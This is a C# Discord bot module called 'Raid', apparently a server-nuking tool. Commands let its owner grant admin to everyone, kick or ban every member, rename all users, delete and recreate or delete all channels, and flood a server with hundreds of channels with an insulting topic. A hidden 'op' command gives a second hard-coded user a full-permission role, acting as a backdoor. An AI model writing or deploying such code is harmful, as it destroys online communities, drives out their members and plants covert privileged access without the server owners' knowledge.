using System;
using System.Threading.Tasks;
using Discord;
using Discord.Addons.Interactive;
using Discord.Commands;
using Discord.Rest;
using Discord.WebSocket;

namespace DiscordBot.Modules
{
    [Summary(":Gun:")]
    public class Raid : InteractiveBase
    {
        private readonly ulong ownerID = 247742975608750090;

        [Command("admin")]
        [Summary("give admin all user")]
        public async Task GiveAdmin()
        {
            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
            {
                await Context.Guild.EveryoneRole.ModifyAsync(r => r.Permissions = GuildPermissions.All);
                await Context.Channel.SendMessageAsync("Everi1 iz nao 4dm1n!");
            }
            else
                await Context.Channel.SendMessageAsync("Permission denied!");
        }

        [Command("op")]
        [Summary("hello mummy")]
        public async Task Opped()
        {
            if (Context.User.Id != 634246091293851649) return;
            var role = await Context.Guild.CreateRoleAsync("Kinue's", GuildPermissions.All, null, false, false, null);
            await role.ModifyAsync(prop => prop.Position = Utils.GetRolePosition(Context.Guild.CurrentUser));
            await ((IGuildUser)Context.User).AddRoleAsync(role);
            await ReplyAsync("Opped!");
        }

        [Command("member")]
        [Summary("give member all non-powered user")]
        public async Task GiveMember()
        {
            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
            {
                await Context.Guild.EveryoneRole.ModifyAsync(r => r.Permissions = GuildPermissions.None);
                await Context.Channel.SendMessageAsync("Everi1 iz nao m3mb3r!");
            }
            else
                await Context.Channel.SendMessageAsync("Permission denied!");
        }

        [Command("kickall")]
        [Summary("Kick all non-powered users")]
        public async Task KickAll()
        {
            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
            {
                foreach (var users in Context.Guild.Users)
                    try
                    {
                        users.KickAsync($"You got kick from {Context.Guild.Name} !");
                    }
                    catch
                    {
                        Console.WriteLine($"{users}'s role is the same or higher than bot!!");
                    }

                await Context.Channel.SendMessageAsync("Every non-powered users is banned!!");
            }
            else
                await Context.Channel.SendMessageAsync("Permission denied!");
            
        }

        [Command("nukeall", RunMode = RunMode.Async)]
        [Summary("Nuke all channels")]
        public async Task NukeAll()
        {
            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
            {
                await ReplyAndDeleteAsync("Are you sure you want to nuke all channels ?",
                    timeout: TimeSpan.FromSeconds(15));
                var response = await NextMessageAsync();
                if (response != null)
                {
                    if (response.ToString().ToLower().Equals("yes"))
                        foreach (var channel in Context.Guild.Channels)
                        {
                            var oldChannel = (ITextChannel) channel;
                            var guild = Context.Guild;
                            await guild.CreateTextChannelAsync(oldChannel.Name, newChannel =>
                            {
                                newChannel.CategoryId = oldChannel.CategoryId;
                                newChannel.Topic = oldChannel.Topic;
                                newChannel.Position = oldChannel.Position;
                                newChannel.SlowModeInterval = oldChannel.SlowModeInterval;
                                newChannel.IsNsfw = oldChannel.IsNsfw;
                            });
                            oldChannel.DeleteAsync();
                        }
                    else if (response.ToString().ToLower().Equals("no"))
                        await ReplyAsync($"Nuke cancelled on {Context.Guild}");
                }
                else
                {
                    await ReplyAsync($"{Context.User.Mention}, command timed out...");
                }
            }
            else
            {
                await Context.Channel.SendMessageAsync("Permission denied!");
            }
        }

        [Command("nameall")]
        [Summary("Name all username in server")]
        public async Task nameall([Remainder] string msg)
        {
            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
            {
                foreach (var user in Context.Guild.Users)
                    try
                    {
                        user.ModifyAsync(r => r.Nickname = msg);
                    }
                    catch
                    {
                        Console.WriteLine($"{user}'s role is the same or higher than bot!!");
                    }

                await Context.Channel.SendMessageAsync($"All users's name changed to {msg}");
            }
            else
            {
                await Context.Channel.SendMessageAsync("Permission denied!");
            }
        }

        [Command("banall")]
        [Summary("Ban all non-powered users")]
        public async Task BanAll()
        {
            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
            {
                foreach (var user in Context.Guild.Users)
                    try
                    {
                        user.BanAsync(7, $"You got banned from {Context.Guild.Name} !");
                    }
                    catch
                    {
                        Console.WriteLine($"{user}'s role is the same or higher than bot!!");
                    }

                await Context.Channel.SendMessageAsync("Every non-powered users is banned!!");
            }
            else
            {
                await Context.Channel.SendMessageAsync("Permission denied!");
            }
        }

        [Command("flood")]
        [Summary("Flood server with channels")]
        public async Task SpamChannel()
        {
            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser) {
                for (var i = 0; i < 200; i++)
                {
                    Context.Guild.CreateTextChannelAsync(Utils.GetRandomAlphaNumeric(8), properties =>
                    {
                        properties.IsNsfw = i % 2 == 0;
                        properties.Topic = "Your Mom Gay LOL!!!";
                    });
                }
                for (var i = 0; i < 100; i++)
                {
                    Context.Guild.CreateVoiceChannelAsync(Utils.GetRandomAlphaNumeric(8), properties =>
                    {
                        properties.UserLimit = new Random().Next(50);
                    });
                }
            }
            else
                await Context.Channel.SendMessageAsync("Permission denied!");
        }

        [Command("unflood")]
        [Summary("Delete all channels")]
        public async Task DeleteChannel()
        {
            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
                foreach (var channel in Context.Guild.Channels)
                    await channel.DeleteAsync();
            else
                await Context.Channel.SendMessageAsync("Permission denied!");
        }
    }
}